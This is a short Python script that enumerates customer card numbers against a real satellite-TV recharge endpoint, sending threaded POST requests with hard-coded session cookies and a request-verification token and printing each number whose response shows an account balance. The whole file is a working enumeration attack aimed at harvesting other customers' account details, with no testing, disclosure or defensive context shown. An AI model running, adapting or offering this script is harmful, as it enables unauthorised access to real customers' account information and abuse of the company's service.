import requests
from concurrent.futures import ThreadPoolExecutor

# Set the target URL and the initial headers
url = "https://www.d2h.com/quick-recharge/details"
headers = {
    "Cookie": "ApplicationGatewayAffinityCORS=9053db6fb831849b3b21384f4d5e50f7; ApplicationGatewayAffinity=9053db6fb831849b3b21384f4d5e50f7; ASP.NET_SessionId=gpdc2gcjx0cu4124bhpobczm; __RequestVerificationToken=ArpR2bHPqV2nNin_QMqmPIAzf5W61iC330IptK6bQGZjqJScaiHuyI2lDv9En5Y436KbBxMXQ8ktfLIpBpK1ZWUr3lVddi5wEzTKyKS97qI1",
    "Content-Type": "application/x-www-form-urlencoded",
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
}

# Function to send a request with a specific vcno value
def check_vcno(vcno_value):
    data = {
        "cusPhone": "",
        "cusId": "",
        "vcno": vcno_value
    }
    response = requests.post(url, headers=headers, data=data)
    
    if response.status_code == 200:
        # Check if "Account Balance:" is in the response text
        if "Account Balance:" in response.text:
            print(f"Account information found for vcno={vcno_value}")
        else:
            pass

# Brute-force a range of vcno numbers using threads
def brute_force_vcnos(start_vcno, end_vcno):
    with ThreadPoolExecutor(max_workers=10) as executor:  # Use 10 threads
        # Submit tasks to the executor for each vcno in the range
        for vcno in range(start_vcno, end_vcno):
            formatted_vcno = str(vcno).zfill(11)  # Ensures 11 digits with leading zeros if necessary
            executor.submit(check_vcno, formatted_vcno)

# Define the start and end of the vcno range
start_vcno = 2900254800
end_vcno = 2900254900  # Adjust this range as necessary

# Start brute-forcing
if __name__ == "__main__":
    brute_force_vcnos(start_vcno, end_vcno)
